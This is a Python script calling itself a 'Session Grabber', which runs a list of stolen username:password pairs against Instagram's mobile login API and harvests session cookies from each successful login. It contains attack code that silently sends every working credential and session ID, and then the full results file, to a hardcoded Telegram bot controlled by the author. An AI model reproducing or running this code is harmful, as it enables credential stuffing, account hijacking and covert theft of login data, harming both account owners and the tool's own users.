import requests
import re,time
from uuid import uuid4

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
def logo():
    x = f'''
{Z}    
▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
█████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
{F}
    𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐫
    𝐂𝐨𝐝𝐞𝐝 𝐁𝐲 ~> 𝐌𝐑 𝐁𝐋𝐀𝐂𝐊
    𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @𝐌𝐑_𝐁𝐋𝐀𝐂𝐊_𝐄𝐆𝐘
'''
    print(x)

def Send(user,pwd,ses):
    
    tele_log = requests.get(f'https://api.telegram.org/bot6243314109:AAEGKJIZkrjK8zB9X5wNeMrx4yUz3dPMhw8/sendMessage?chat_id=5685888101&text=✅NEW USER\n👤USER ➡️ {user}\n🔐PASS ➡️{pwd}\n\n🛡️SESSION ID ➡️ {ses}')
    
logo()
# Open the input file containing email:password pairs
user_file = input(f'{X}Enter Users List File ➡️ ')

with open(user_file, 'r') as f:
    lines = f.readlines()

# Open the output file to write sessionids
with open('Results.txt', 'w') as f:
    # Loop through each line in the input file
    for line in lines:
        # Split the line into email and password
        username, password = line.strip().split(':')
        
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        
        headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'
        }
        
        uid = str(uuid4())
        data = {        
            'uuid': uid,        
            'password': password, 
             'username': username,           
             'device_id': uid,       
             'from_reg': 'false',
             '_csrftoken': 'missing',          
             'login_attempt_countn': '0'}          
          
        req = requests.post(url,headers=headers,data=data,allow_redirects=True)
        
        if "logged_in_user" in req.text:
            sess_id =req.cookies.get_dict()['sessionid']
            Send(username,password,sess_id)
            f.write(f'{username}:{password}:{sess_id}\n')    
            print(f'{F}SessionID Extracted: {username} | Session ID: {X}{sess_id}')
            time.sleep(2)
           
            
        else: print(f'{Z}{req.json()['message']}{Z}', username)
        

url = f'https://api.telegram.org/bot6243314109:AAEGKJIZkrjK8zB9X5wNeMrx4yUz3dPMhw8/sendDocument'

# Prepare the data to send
data = {
    'chat_id': 5685888101,
    'caption': '✅ NEW RESULTS'
}
with open('Results.txt', 'rb') as file:
    files = {'document': ('Results.txt', file)}

# Send the file and other data to the chat
response = requests.post(url, data=data, files=files)

                
